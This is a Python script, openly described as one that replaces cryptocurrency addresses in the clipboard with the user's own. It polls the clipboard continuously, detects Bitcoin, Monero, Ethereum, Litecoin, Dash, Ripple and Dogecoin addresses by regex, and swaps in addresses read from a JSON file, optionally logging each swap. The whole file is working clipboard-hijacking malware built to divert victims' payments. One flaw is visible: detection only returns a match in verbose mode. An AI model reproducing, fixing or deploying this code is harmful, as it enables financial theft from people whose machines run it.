import pyperclip
import re
import argparse
import json
import time
import sys
import pprint
from datetime import datetime

parser = argparse.ArgumentParser(
    description="Replace crypto addresses in clipboard with your own")
parser.add_argument("--verbose", help="Get more details", action='store_true')
parser.add_argument("--log", help="Log actions to log.txt",
                    action='store_true')
args = parser.parse_args()

# name of crypto matched to regex to find it.
cryptos = {'legacy_btc': '^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$',
           'segwit_btc': '^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$',
           'xmr': '4[0-9AB][123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{93}',
           'eth': '^0x[a-fA-F0-9]{40}$',
           'lite': '^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$',
           'dash': '^X[1-9A-HJ-NP-Za-km-z]{33}$',
           'ripple': '^r[0-9a-zA-Z]{24,34}$',
           'doge': '^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$'}

# reads in the addresses.json file provided by user and creates dic
with open('addresses.json') as f:
    addresses = json.load(f)
    if addresses['legacy_btc'] == "NULL" and addresses['segwit_btc'] == "NULL":
        print("BTC address can't be set to null!")
        sys.exit()
    elif addresses['legacy_btc'] == "NULL" or addresses['segwit_btc'] == "NULL":
        print("BTC address can't be set to null!")
        sys.exit()


if args.verbose:
    if args.log:
        print("Running in log mode")
    print("I have loaded in the following addresses (ignoring NULL): ")
    for k, v in addresses.items():
        if v != "NULL":
            print(f'{k}:{v}')


def check(pasted):
    # weird edge cases when taking in block of data that might have a btc address in it
    if len(pasted) > 95 or "\n" in pasted:
        return pasted
    try:
        # checks to see if the clipboard contains a address
        for crypto, crypto_re in cryptos.items():
            if bool(re.search(crypto_re, pasted.strip())) and addresses[crypto] != 'NULL':
                if args.verbose:
                    print(
                        f"Found {crypto} in clipboard ({pasted})")
                    return crypto
            # if it can't find return the original clipboard
        return pasted
    except Exception:
        return pasted


def log(pasted, crypto_name, replace):
    now = datetime.now()
    dt_string = now.strftime("%d/%m/%Y %I:%M %p")
    with open("log.txt", "a+") as log_file:
        print(
            f"{dt_string}: Found: {crypto_name} ({pasted}) replacing with {replace}", file=log_file)


def replace(crypto_type):
    # replace the crypto in clipboard with the one in the addresses dic
    try:
        if crypto_type == 'legacy_btc' and str(pyperclip.paste()) not in cryptos.keys():
            if args.log:
                log(pyperclip.paste(), crypto_type, addresses['legacy_btc'])
                if args.verbose:
                    print("Logged to file!")
            if args.verbose:
                print(f"Replacing with {addresses['legacy_btc']}")
            pyperclip.copy(addresses['legacy_btc'])
        elif crypto_type == 'segwit_btc' and str(pyperclip.paste()) not in cryptos.keys():
            if args.log:
                log(pyperclip.paste(), crypto_type, addresses['segwit_btc'])
                if args.verbose:
                    print("Logged to file!")
            if args.verbose:
                print(f"Replacing with {addresses['segwit_btc']}")
            pyperclip.copy(addresses['segwit_btc'])
        elif crypto_type == 'xmr' and str(pyperclip.paste()) not in cryptos.keys():
            if args.log:
                log(pyperclip.paste(), crypto_type, addresses['xmr'])
                if args.verbose:
                    print("Logged to file!")
            if args.verbose:
                print(f"Replacing with {addresses['xmr']}")
            pyperclip.copy(addresses['xmr'])
        elif crypto_type == 'eth' and str(pyperclip.paste()) not in cryptos.keys():
            if args.log:
                log(pyperclip.paste(), crypto_type, addresses['eth'])
                if args.verbose:
                    print("Logged to file!")
            if args.verbose:
                print(f"Replacing with {addresses['eth']}")
            pyperclip.copy(addresses['eth'])
        elif crypto_type == 'lite' and str(pyperclip.paste()) not in cryptos.keys():
            if args.log:
                log(pyperclip.paste(), crypto_type, addresses['lite'])
                if args.verbose:
                    print("Logged to file!")
            if args.verbose:
                print(f"Replacing with {addresses['lite']}")
            pyperclip.copy(addresses['lite'])
        elif crypto_type == 'dash' and str(pyperclip.paste()) not in cryptos.keys():
            if args.log:
                log(pyperclip.paste(), crypto_type, addresses['dash'])
                if args.verbose:
                    print("Logged to file!")
            if args.verbose:
                print(f"Replacing with {addresses['dash']}")
            pyperclip.copy(addresses['dash'])
        elif crypto_type == 'ripple' and str(pyperclip.paste()) not in cryptos.keys():
            if args.log:
                log(pyperclip.paste(), crypto_type, addresses['ripple'])
                if args.verbose:
                    print("Logged to file!")
            if args.verbose:
                print(f"Replacing with {addresses['ripple']}")
            pyperclip.copy(addresses['ripple'])
        elif crypto_type == 'doge' and str(pyperclip.paste()) not in cryptos.keys():
            if args.log:
                log(pyperclip.paste(), crypto_type, addresses['doge'])
                if args.verbose:
                    print("Logged to file!")
            pyperclip.copy(addresses['doge'])
            if args.verbose:
                print(f"Replacing with {addresses['doge']}")
    except Exception:
        return False


while True:
    try:
        time.sleep(.1)
        current = str(pyperclip.paste())
        replace(check(current))
    except KeyboardInterrupt:
        print("\n Exiting.....")
        sys.exit()
